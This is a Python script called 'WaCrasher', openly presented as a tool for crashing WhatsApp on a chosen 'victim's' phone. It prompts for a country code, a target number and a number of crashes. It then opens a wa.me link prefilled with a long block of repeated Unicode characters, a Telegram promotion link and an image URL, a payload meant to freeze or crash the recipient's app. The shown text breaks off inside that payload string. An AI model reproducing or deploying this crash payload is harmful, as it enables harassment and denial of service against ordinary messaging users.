# Copyright (c) 23/july/2023 BONITOMINATI

# Permission is hereby granted, free of charge, to any person obtaining a copy
#of this software and associated documentation files (the "Software"), to deal
#in the Software without restriction, including without limitation the rights
#to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
#copies of the Software, and to permit persons to whom the Software is
#furnished to do so, subject to the following conditions:
#
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
#FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
#AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
#LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
#OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
#SOFTWARE.
####################################################
#Author  : MR.Bonito & MR.Minati(BONITOMINATI)     #
#Project : WaCrasher                               #
#Type    : Whatsapp - Crasher                      #
#lang    : python v3.* (py3)                       #
#Owner   : Azhar YT, Miss Praveen                  #
####################################################

##################################################################################################################################################################################################################################################


import os
import colorama
import time
import sys
from colorama import  Fore,Style
R = Fore.RED
B = Fore.BLUE
G = Fore.GREEN
C = Fore.CYAN
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
try:
	import colorama
except ModuleNotFoundError:
	print("Requests is not Installed")
	os.system("pip install colorama")

logo = f"""
{Y} __________________________________________________________________________________________
{G}                                                                            /$$         {G}|
                                                                           | $$         {G}|
       /$$  /$$  /$$  /$$$$$$         /$$$$$$$  /$$$$$$  /$$$$$$   /$$$$$$$| $$$$$$$    {R}|
      | $$ | $$ | $$ |____  $$       /$$_____/ /$$__  $$|____  $$ /$$_____/| $$__  $$   {R}|
      | $$ | $$ | $$  /$$$$$$$      | $$      | $$  \__/ /$$$$$$$|  $$$$$$ | $$  \ $$   {R}|
      | $$ | $$ | $$ /$$__  $$      | $$      | $$      /$$__  $$ \____  $$| $$  | $$   {G}|
      |  $$$$$/$$$$/|  $$$$$$$      |  $$$$$$$| $$     |  $$$$$$$ /$$$$$$$/| $$  | $$   {G}|
       \_____/\___/  \_______/       \_______/|__/      \_______/|_______/ |__/  |__/   {G}|
                                                                                        {G}|
{G}             ⠀⢰⣶⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣤⣤⣤⣤⣤⣦⣤⣤⣤⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{G} ⢀⣸⣿⣧⣀⣀⣀⣀⣠⡾⣿⠿⠿⣿⣿⣿⣿⣶⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣟⣻⣛⣛⣿⣻⣿⣛⣛⣛⣻⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{R}⠘⠻⢿⡿⠟⠛⠿⠿⠿⠷⠟⠓⠛⠛⢿⣿⣿⣿⣿⣧⣼⣿⣤⣾⣟⣿⣿⣿⣿⠿⣿⣿⣛⣻⣿⣿⡛⢛⡿⢿⠿⢿⠿⣿⣿⣿⣶⣶⡤⣴⠒⠒⠶⠤⠤⣄⣀⣀⣀⠀⠀
{R}⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠛⠏⠉⠉⠙⣿⣟⣿⣿⣿⣿⡟⠛⢻⣿⣿⣷⣾⣿⡿⠿⣿⣿⣿⠿⢾⢉⠁⠐⠂⣲⡀⢤⣤⢩⣹⣇  {W} BONITOMINATI
{G}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⠋⠿⠳⠤⠯⠼⢿⣭⣿⢿⠁⠀⠀⠉⠙⠳⠷⣦⣤⣤⣬⣙⠛⠲⠾⣶⣿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠈⢿⡙⣌⣧⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⣿⣦⣴⣶⣾⣿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠈⣧⠹⣼⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⡿⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

{Y}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{Y}|{R} █░█ ▄▀█  █▀▀ █▀█ ▄▀█ █▀ █░█ █▀▀ █▀█ {Y}|
{Y}|{G} █▀█ █▀█  █▄▄ █▀▄ █▀█ ▄█ █▀█ ██▄ █▀▄ {Y}|
{Y}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  v.1.0
  BY BONITOMINATI                                    
"""

def main():
	os.system('clear')
	print(logo)
	print()
	cncode=int(input(f'{G}[{Y}+{G}]{M} Enter Country Code WithOut "+" eg.91 {C}=> '))
	print()
	num=input(f"{G}[{Y}+{G}]{M} Enter the Victim's Phone number\n\n{C}=> {cncode}  ")
	print()
	crash=int(input(f'{G}[{Y}+{G}]{M} Enter the number of crashes {W}(Max 15 per 30min) \n\n{C}=> '))
	combnum = f"+{cncode}{num}"
	print()
	Finalcall=input(f'{G}[?]{W} Do You Want To Change NO.{W}{combnum} {R}(Y/N)\n\n{C}=> ')
	if Finalcall == 'Y'  or Finalcall == 'y':
		main()
	elif Finalcall == 'N' or Finalcall == 'n':
		os.system('clear')
		print(f"{G}[{Y}+{G}]{M}Crashing Whatsapp on No. : +{cncode}{num} ...")
		time.sleep(5)
		link = (f"""xdg-open https://wa.me/{combnum}/?text=https://t.me/bonitominati

卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍66卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6

 ๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘
 http://tinypic.com/view.php?pic=14w39zb&s=9#.XAv9W2hKjIU  ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๘๘๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘๘๘๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๘๘๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๘๘๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘

881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6
卍6卍6卍6 ๘๘๘๘๘๘๘๘ 卍6卍6卍6

 ๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘
 http://tinypic.com/view.php?pic=14w39zb&s=9#.XAv9W2hKjIU  ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๘๘๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘๘๘๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๘๘๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๘๘๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘
๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘๘๘๘๘๘๘๘ ๘๘๘๘๘๘๘๘ ๕๕๕๕๕๕๕๕ ๘

881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
881416 ๓๓รᏋ๓ค๔คห ฮเๆค.คฯเฤ 769ฬ๓๓
